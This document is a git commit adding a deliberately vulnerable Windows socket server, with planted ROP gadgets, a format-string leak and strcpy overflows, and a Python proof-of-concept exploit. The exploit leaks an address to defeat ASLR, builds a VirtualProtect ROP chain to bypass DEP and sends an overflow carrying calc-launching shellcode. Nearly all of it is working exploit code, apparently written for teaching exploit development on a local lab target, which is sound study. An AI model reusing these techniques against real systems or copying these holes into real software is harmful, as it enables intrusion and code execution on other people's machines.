1e44fd027527c12dd4b74fcac377fc1ffef75810
0wa1s <63906285+0wa1s@users.noreply.github.com>
2021-04-27 01:55:04 +0300

    Stack Based Buffer Overflow ASLR+DEP Bypass
    Stack Based Buffer Overflow With ASLR and DEP Bypass using memory leak Example code

---
+++ SourceCode/PocMemLeak/PocMemLeak/PocMemLeak.cpp
@@ -0,0 +1,271 @@
+/*
+	Live Server on port 8888
+*/
+#include "StdAfx.h"
+#include<io.h>
+#include<stdio.h>
+#include<winsock2.h>
+#include<string.h>
+#include<windows.h>
+#define _WIN32_WINNT_WIN7                   0x0601
+
+#pragma comment(lib,"ws2_32.lib") //Winsock Library
+int foo() {
+	__asm
+	{
+		PUSH eax
+		mov eax,1
+		CMP eax,2
+		JG FOOBAR_1
+		JMP OTHERLB
+		OTHERLB:
+		ROR EAX,8
+		JMP ENDLB
+
+		FOOBAR_1:
+		JMP ESP
+		RETN
+		PUSHAD
+		RETN
+		POP EAX
+		POP ECX
+		RETN
+		ADD ESP,200
+		POP EAX
+		POP ECX
+		RETN
+		POP EAX
+		POP ECX
+		RETN
+		PUSH EAX
+		PUSH ECX
+		PUSH EDX
+		PUSH 0x40
+		POP ECX
+		MOV EDX, ECX
+		RETN
+		
+		FOOBAR_2:
+		PUSH 0xFF20
+		POP EAX
+		MOV EAX, 0xFF20
+		JMP [EAX]
+		RETN
+		PUSH 0xFF20
+		MOV ESI,dword ptr[EAX]
+		RETN
+
+
+		ENDLB:
+		NOP
+		POP EAX
+
+		
+	}
+	return 0;
+}
+
+int bar(int x) {
+
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+	DWORD oldprotect = 0;
+
+	unsigned char payload[] = {
+		0x90,		// NOP
+		0x90,		// NOP
+		0x90,		// INT3
+		0xc3		// RET
+	};
+	unsigned int payload_len = 4;
+
+	// Allocate a memory buffer for payload
+	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	//printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
+	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
+	// Copy payload to new buffer
+	RtlMoveMemory(exec_mem, payload, payload_len);
+
+	// Make new buffer as executable
+	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	
+	// If all good, run the payload
+	if (rv != 0) {
+		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+		WaitForSingleObject(th, -1);
+	}
+
+	return 0;
+
+	LPVOID ptr = VirtualAlloc(NULL, 3000, MEM_RESERVE, PAGE_READWRITE); //reserving memory
+	ptr = VirtualAlloc(ptr, 3000, MEM_COMMIT, PAGE_READWRITE); //commiting memory
+	memset(ptr, 'a', 3000);
+	VirtualFree(ptr, 0, MEM_RELEASE); //releasing memory
+	return 0;
+
+}
+
+int copy(char input_1[], char input_2[]) {
+	strcpy(input_1, input_2);
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	foo();
+	bar(2);
+
+	WSADATA wsa;
+	SOCKET s, new_socket;
+	struct sockaddr_in server, client;
+	int c;
+	char *message;
+
+	printf("\nInitialising Winsock...");
+	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+	{
+		printf("Failed. Error Code : %d", WSAGetLastError());
+		return 1;
+	}
+
+	printf("Initialised.\n");
+
+	//Create a socket
+	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+	{
+		printf("Could not create socket : %d", WSAGetLastError());
+	}
+
+	printf("Socket created.\n");
+
+	//Prepare the sockaddr_in structure
+	server.sin_family = AF_INET;
+	server.sin_addr.s_addr = INADDR_ANY;
+	server.sin_port = htons(8888);
+
+	//Bind
+	if (bind(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
+	{
+		printf("Bind failed with error code : %d", WSAGetLastError());
+		exit(EXIT_FAILURE);
+	}
+
+	puts("Bind done");
+
+	//Listen to incoming connections
+	listen(s, 3);
+
+	//Accept and incoming connection
+	puts("Waiting for incoming connections...");
+
+	c = sizeof(struct sockaddr_in);
+
+	while ((new_socket = accept(s, (struct sockaddr *)&client, &c)) != INVALID_SOCKET)
+	{
+		puts("Connection accepted");
+
+		
+			//Reply to the client
+			char message_1[] = "Input#1: ";
+			char message_2[] = "Input#2: ";
+			char input_1[16] = "";
+			char input_2[32] = "";
+			char data[200] = "";
+			
+
+			// send first line msg to get user input_1
+			send(new_socket, message_1, strlen(message_1), 0);
+			
+			// get user input_1
+			recv(new_socket, input_1, 128, 0);
+			// debug console print
+			printf(input_1);
+			printf("\nData received...\nWriting Data to file....");
+
+			// write data to file			
+			FILE * fp;
+			fp = fopen("file.txt", "wb+");
+//orignal file print code
+			fprintf(fp, input_1);
+
+/*
+// start new code
+			va_list aptr;
+			va_start(aptr, input_1);
+			vsnprintf(data, sizeof(data) , input_1, aptr);
+			va_end(aptr);
+// end new code
+			printf(data);
+*/			fclose(fp);
+
+			printf("\nData written to file....");
+			printf("\nReading file....");
+
+			fp = fopen("file.txt", "rb");
+			
+			fgets(data, 200, fp);
+			printf("\nData written to file:-\r\n");
+
+//			printf(data);
+			fclose(fp);
+			printf("\nSending file contents to socket!");
+
+			send(new_socket, data, strlen(data), 0);
+
+			// send second line msg to get user input_2
+			send(new_socket, message_2, strlen(message_2), 0);
+
+			// get user input_2
+			recv(new_socket, input_2, 1024, 0);
+			printf("\nSize of Input_2: %d", strlen(input_2));
+			strcpy(input_1, input_2);
+			
+
+			int crash = 0;
+			int e=10;
+			try 
+			{
+				crash = copy(input_1, input_2);
+				if(crash == e)
+				{
+					throw e;
+				}
+				
+			}
+
+			catch(long h)
+			{
+				printf("Exception#3! copy error");
+				for(int k=0; k<5; k++)
+					int i=k^2;
+			}
+		
+			catch(char h)
+			{
+				printf("Exception#3! copy error");
+				for(int k=0; k<5; k++)
+					int i=k^2;
+			}
+			
+			
+		
+
+			printf("\nCopy Completed!\n");
+			//getchar();
+		
+	}
+
+	if (new_socket == INVALID_SOCKET)
+	{
+		printf("accept failed with error code : %d", WSAGetLastError());
+		return 1;
+	}
+
+	closesocket(s);
+	WSACleanup();
+
+	return 0;
+}	
---
+++ poc.py
@@ -0,0 +1,120 @@
+#!/usr/bin/python
+import socket
+import os
+import sys
+import time
+import struct
+
+# relative displacement is 20a0
+# leak address is 436b20a0
+# base address is 0x436b20a0 - 0x20a0 = 436b0000
+# rop chain generated with mona.py - www.corelan.be
+
+buffer_1="%4x"
+buffer_2="A"*66
+buffer_2="A"*60
+
+expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+expl.connect(("127.0.0.1", 8888))
+# read line 1
+x = expl.recv(1024)
+print("Leaking Address")
+#print(x)
+
+# send input_1
+expl.send(buffer_1)
+# read back line 2 sent from server
+x = expl.recv(1024)
+# leaking address
+#print(x)
+leaked_address = int(x, 16)
+# calculating base address since we know leaked address is at displacment of 0x43b8
+base_address = leaked_address - 0x43b8
+print("Base Address: " + hex(base_address))
+
+x = expl.recv(1024)
+#print(x)
+
+
+print("Building Rop Chain")
+
+def create_rop_chain(base_address):
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+     
+
+      #[---INFO:gadgets_to_set_edi:---]
+      base_address + 0x1e2f,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+      base_address + 0x1da1,  # RETN (ROP NOP) [PocMemLeak.exe] ** REBASED ** ASLR
+      0x41414141,  # Filler (compensate)
+      0x41414141,  # Filler (compensate)
+      0x41414141,  # Filler (compensate)
+      
+    #[---INFO:gadgets_to_set_esi:---]
+      base_address + 0x1027,  # POP EAX # POP ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+      base_address + 0x300c,  # ptr to &VirtualProtect() [IAT PocMemLeak.exe] ** REBASED ** ASLR
+      0x41414141,  # Filler (compensate)
+      base_address + 0x1046,  # MOV ESI,DWORD PTR DS:[EAX] # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+
+      #[---INFO:gadgets_to_set_eax:---]
+      base_address + 0x101b,  # POP EAX # POP ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+      0x90909090,  # nop
+      0x41414141,  # Filler (compensate)
+            
+      #[---INFO:gadgets_to_set_ebx:---]
+      base_address + 0x1e31,  # POP EBX # POP EBP # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+      0x00000201,  # 0x00000201-> ebx
+      0x41414141,  # Filler (compensate)
+
+      #[---INFO:gadgets_to_set_ebp:---]
+      base_address + 0x104e,  # POP EBP # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+      base_address + 0x1016,  # & jmp esp [PocMemLeak.exe] ** REBASED ** ASLR
+
+      #[---INFO:gadgets_to_set_edx:---]
+      base_address + 0x1931,  # POP ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+      0x00000040,  # 0x00000040-> edx
+      base_address + 0x1030,  # MOV EDX,ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+
+     #[---INFO:gadgets_to_set_ecx:---]
+      base_address + 0x1025,  # POP ECX # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+      base_address + 0x4aa5,  # &Writable location [PocMemLeak.exe] ** REBASED ** ASLR
+
+
+     #[---INFO:pushad:---]
+      base_address + 0x1019,  # PUSHAD # RETN [PocMemLeak.exe] ** REBASED ** ASLR 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+rop_chain = create_rop_chain(base_address)
+print("First Rop gadget Address: 0x%x"%(base_address + 0x1e2f))
+
+sec = raw_input("Press Enter to continue...")
+
+module_entry = base_address + 0x1b76
+jmp_to_entry = "\xE8" + str(module_entry)
+shell_calc = ""
+shell_calc += "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
+shell_calc += "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
+shell_calc += "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
+shell_calc += "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
+shell_calc += "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
+shell_calc += "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
+shell_calc += "\x45\x81\x3e\x43\x72\x65\x61\x75"
+shell_calc += "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
+shell_calc += "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
+shell_calc += "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
+shell_calc += "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
+shell_calc += "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
+shell_calc += "\x6c\x63\x89\xe2\x52\x52\x53\x53"
+shell_calc += "\x53\x53\x53\x53\x52\x53\xff\xd7"
+
+
+#junk = "\x41"*756 + "\x42"*4 + "\x43"*400
+#junk = "\x41"*756 + "\x16\x10\x06\x44" + "\x90\x90\xCC"*200
+#junk = "\x41"*756 + "\x44"*4 + "\xCC"*200
+junk = "\x41"*756 + rop_chain + "\x90"*32  + shell_calc + "\x90"*32
+expl.send(junk)
+
+
+expl.close()
